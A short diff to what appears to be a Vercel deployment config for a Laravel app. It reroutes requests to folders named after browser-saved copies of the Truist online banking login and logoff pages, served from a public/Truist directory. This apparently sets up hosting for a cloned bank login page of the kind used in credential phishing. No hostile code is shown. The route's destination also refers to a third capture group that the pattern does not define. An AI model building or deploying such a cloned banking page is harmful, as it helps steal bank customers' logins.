@@ -5,11 +5,11 @@
         { "src": "/public/**", "use": "@vercel/static" }
     ],
     "routes": [
-        
         {
-            "src": "/(.*)",
-            "dest": "/api/index.php"
+            "src": "/(Logoff _ Truist_files|Truist Online Banking Login _ Truist_files|vendor)/(.*)",
+            "dest": "public/Truist/$1/$2/$3"
         }
+        
     ],
     "env": {
         "APP_NAME": "Vercel Laravel",
